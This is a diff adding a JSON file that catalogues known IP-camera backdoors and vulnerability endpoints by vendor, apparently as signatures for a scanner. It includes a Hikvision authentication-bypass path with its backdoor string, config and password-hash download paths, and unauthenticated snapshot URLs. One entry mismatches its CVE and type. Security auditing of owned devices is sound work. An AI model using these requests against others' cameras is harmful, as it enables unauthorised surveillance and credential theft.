@@ -1,0 +1,152 @@
+{
+  "_description": "Known camera backdoors and vulnerability endpoints",
+  "_updated": "2025-01-01",
+  "hikvision": [
+    {
+      "name": "Hikvision Backdoor CVE-2017-7921",
+      "type": "auth_bypass",
+      "method": "GET",
+      "path": "/system/deviceInfo?auth=YWRtaW46MTEK",
+      "description": "Authentication bypass via magic string in older firmware",
+      "cve": "CVE-2017-7921"
+    },
+    {
+      "name": "Hikvision Command Injection CVE-2021-36260",
+      "type": "rce",
+      "method": "PUT",
+      "path": "/SDK/webLanguage",
+      "description": "Command injection in web server, pre-auth RCE",
+      "cve": "CVE-2021-36260"
+    },
+    {
+      "name": "Hikvision SSRF CVE-2021-36260",
+      "type": "info_disclosure",
+      "method": "GET",
+      "path": "/ISAPI/Security/sessionLogin/capabilities",
+      "description": "Session info disclosure",
+      "cve": ""
+    },
+    {
+      "name": "Hikvision Config Disclosure",
+      "type": "info_disclosure",
+      "method": "GET",
+      "path": "/System/configurationFile?auth=YWRtaW46MTEK",
+      "description": "Configuration file download with backdoor auth",
+      "cve": "CVE-2017-7921"
+    }
+  ],
+  "dahua": [
+    {
+      "name": "Dahua Auth Bypass CVE-2021-33044",
+      "type": "auth_bypass",
+      "method": "POST",
+      "path": "/RPC2_Login",
+      "description": "Authentication bypass in login process",
+      "cve": "CVE-2021-33044"
+    },
+    {
+      "name": "Dahua Config Leak",
+      "type": "info_disclosure",
+      "method": "GET",
+      "path": "/current_config/passwd",
+      "description": "Password hash disclosure in older firmware",
+      "cve": ""
+    },
+    {
+      "name": "Dahua Snapshot Without Auth",
+      "type": "info_disclosure",
+      "method": "GET",
+      "path": "/cgi-bin/snapshot.cgi?channel=0",
+      "description": "Unauthenticated snapshot access",
+      "cve": ""
+    },
+    {
+      "name": "Dahua Debug Console",
+      "type": "debug",
+      "method": "GET",
+      "path": "/current_config/Account1",
+      "description": "Debug account info disclosure",
+      "cve": ""
+    }
+  ],
+  "axis": [
+    {
+      "name": "Axis Server Identity",
+      "type": "info_disclosure",
+      "method": "GET",
+      "path": "/axis-cgi/param.cgi?action=list&group=Brand",
+      "description": "Brand and model information disclosure",
+      "cve": ""
+    },
+    {
+      "name": "Axis Firmware Info",
+      "type": "info_disclosure",
+      "method": "GET",
+      "path": "/axis-cgi/param.cgi?action=list&group=Properties.Firmware",
+      "description": "Firmware version disclosure",
+      "cve": ""
+    }
+  ],
+  "dlink": [
+    {
+      "name": "D-Link HNAP Auth Bypass",
+      "type": "auth_bypass",
+      "method": "POST",
+      "path": "/HNAP1/",
+      "description": "HNAP authentication bypass in multiple models",
+      "cve": "CVE-2020-8863"
+    },
+    {
+      "name": "D-Link Config Disclosure",
+      "type": "info_disclosure",
+      "method": "GET",
+      "path": "/config/configuration.cgi",
+      "description": "Configuration file download",
+      "cve": ""
+    }
+  ],
+  "foscam": [
+    {
+      "name": "Foscam Info Disclosure",
+      "type": "info_disclosure",
+      "method": "GET",
+      "path": "/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo",
+      "description": "Device information without authentication",
+      "cve": ""
+    }
+  ],
+  "generic": [
+    {
+      "name": "ONVIF Device Info",
+      "type": "info_disclosure",
+      "method": "POST",
+      "path": "/onvif/device_service",
+      "description": "ONVIF GetDeviceInformation (often unauthenticated)",
+      "cve": ""
+    },
+    {
+      "name": "UPnP Device Description",
+      "type": "info_disclosure",
+      "method": "GET",
+      "path": "/upnp/device_description.xml",
+      "description": "UPnP device description XML",
+      "cve": ""
+    },
+    {
+      "name": "Common Snapshot Endpoints",
+      "type": "info_disclosure",
+      "method": "GET",
+      "paths": [
+        "/snapshot.cgi",
+        "/cgi-bin/snapshot.cgi",
+        "/snap.jpg",
+        "/image.jpg",
+        "/tmpfs/snap.jpg",
+        "/camera/snapshot.jpg",
+        "/webcapture.jpg?command=snap&channel=0"
+      ],
+      "description": "Common unauthenticated snapshot endpoints",
+      "cve": ""
+    }
+  ]
+}
